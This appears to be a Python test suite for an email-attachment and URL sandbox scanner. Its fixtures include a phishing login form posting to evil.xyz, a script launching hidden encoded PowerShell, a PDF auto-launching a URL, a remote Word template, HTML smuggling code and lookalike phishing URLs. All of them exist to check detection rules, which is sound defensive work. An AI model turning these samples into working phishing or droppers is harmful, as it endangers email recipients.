import base64
import hashlib
import hmac
import io
import json
import time
import uuid
import zipfile

import pytest

from sandbox_app.engine import analyze_request

EICAR = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
MZ = b"MZ" + b"\x00" * 58 + b"\x80\x00\x00\x00" + b"\x00" * 64 + b"PE\x00\x00" + b"\x4c\x01\x00\x00" + b"\x00" * 200


def att(name, data, ctype=""):
    return {"filename": name, "content_type": ctype, "data_b64": base64.b64encode(data).decode()}


def run(**kw):
    return analyze_request({"request_id": "t", **kw})


def test_clean_text_is_safe():
    r = run(attachments=[att("notes.txt", b"Minutes of the weekly meeting. Nothing unusual here.\n" * 20)])
    assert r["verdict"] == "SAFE"
    assert r["files"][0]["detected_type"] == "Plain text"
    assert len(r["files"][0]["sha256"]) == 64


def test_eicar_is_malicious():
    r = run(attachments=[att("readme.txt", EICAR)])
    assert r["verdict"] == "MALICIOUS"
    ids = {f["rule_id"] for f in r["files"][0]["findings"]}
    assert "SBX-REP-001" in ids or "SBX-REP-002" in ids


def test_double_extension_exe_malicious():
    r = run(attachments=[att("invoice.pdf.exe", MZ)])
    f = r["files"][0]
    assert f["detected_type"] == "PE executable"
    assert f["verdict"] == "MALICIOUS"
    assert "SBX-FN-002" in {x["rule_id"] for x in f["findings"]}


def test_exe_disguised_as_pdf():
    r = run(attachments=[att("statement.pdf", MZ, "application/pdf")])
    assert "SBX-FT-006" in {x["rule_id"] for x in r["files"][0]["findings"]}
    assert r["verdict"] == "MALICIOUS"


def test_zip_with_script_and_password_flag():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("payment.js", "var s=new ActiveXObject('WScript.Shell');s.Run('powershell -w hidden -enc AAAA');")
    r = run(attachments=[att("payment.zip", buf.getvalue())])
    f = r["files"][0]
    assert f["children"] and f["children"][0]["verdict"] != "SAFE"
    assert r["verdict"] == "MALICIOUS"


def test_html_credential_phish():
    page = b"""<html><title>Microsoft 365 sign in</title><form action="https://evil.xyz/p.php">
    <input type=email><input type=password></form><script>eval(atob('YWxlcnQoMSk='))</script></html>"""
    r = run(attachments=[att("Secure_Message.html", page)])
    assert r["verdict"] == "MALICIOUS"
    assert "SBX-HTM-001" in {x["rule_id"] for x in r["files"][0]["findings"]}


def test_pdf_openaction_js():
    pdf = b"%PDF-1.7\n1 0 obj<</Type/Catalog/OpenAction 2 0 R>>endobj\n2 0 obj<</S/JavaScript/JS(app.launchURL('http://1.2.3.4/x'))>>endobj\n%%EOF"
    r = run(attachments=[att("doc.pdf", pdf)])
    ids = {x["rule_id"] for x in r["files"][0]["findings"]}
    assert {"SBX-PDF-002", "SBX-PDF-003"} <= ids
    assert r["verdict"] in ("SUSPICIOUS", "MALICIOUS")


def test_ooxml_remote_template():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/document.xml", "<w:document/>")
        z.writestr("word/_rels/settings.xml.rels",
                   '<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
                   'Target="http://203.0.113.5/t.dotm" TargetMode="External"/></Relationships>')
    r = run(attachments=[att("offer.docx", buf.getvalue())])
    assert r["files"][0]["detected_type"] == "Word OOXML"
    assert "SBX-OFF-003" in {x["rule_id"] for x in r["files"][0]["findings"]}
    assert r["verdict"] == "MALICIOUS"


def test_urls():
    r = run(urls=["https://www.google.com/search?q=x", "http://paypa1-secure.xyz/login/verify", "http://192.168.10.5/a.exe",
                  "https://incometax-gov-in.refund.top/kyc"])
    by = {u["url"]: u for u in r["urls"]}
    assert by["https://www.google.com/search?q=x"]["verdict"] == "SAFE"
    assert by["http://paypa1-secure.xyz/login/verify"]["verdict"] != "SAFE"
    assert by["http://192.168.10.5/a.exe"]["verdict"] == "MALICIOUS"
    assert by["https://incometax-gov-in.refund.top/kyc"]["verdict"] == "MALICIOUS"


def test_html_smuggling_body():
    body = "<script>var b=new Blob([d]);var a=document.createElement('a');a.href=URL.createObjectURL(b);a.download='x.iso';a.click()</script>"
    r = run(html_bodies=[body])
    assert r["html_body"]["verdict"] == "MALICIOUS"


def test_isolated_runner_and_api(monkeypatch):
    monkeypatch.setenv("SANDBOX_SHARED_SECRET", "s3cret")
    import importlib
    from sandbox_app import main
    importlib.reload(main)
    from fastapi.testclient import TestClient
    c = TestClient(main.app)
    assert c.get("/health").json()["status"] == "ok"
    body = json.dumps({"request_id": "x", "attachments": [att("a.txt", EICAR)]}).encode()
    ts, nonce = str(int(time.time())), uuid.uuid4().hex
    sig = hmac.new(b"s3cret", f"{ts}.{nonce}.".encode() + hashlib.sha256(body).hexdigest().encode(), hashlib.sha256).hexdigest()
    h = {"x-sandbox-timestamp": ts, "x-sandbox-nonce": nonce, "x-sandbox-signature": sig, "content-type": "application/json"}
    r = c.post("/v1/analyze", content=body, headers=h)
    assert r.status_code == 200, r.text
    assert r.json()["verdict"] == "MALICIOUS"
    assert r.json()["isolation"]["limits"]["network"] == "disabled"
    # replay rejected
    assert c.post("/v1/analyze", content=body, headers=h).status_code == 401
    # bad signature rejected
    h2 = dict(h, **{"x-sandbox-nonce": uuid.uuid4().hex})
    assert c.post("/v1/analyze", content=body, headers=h2).status_code == 401
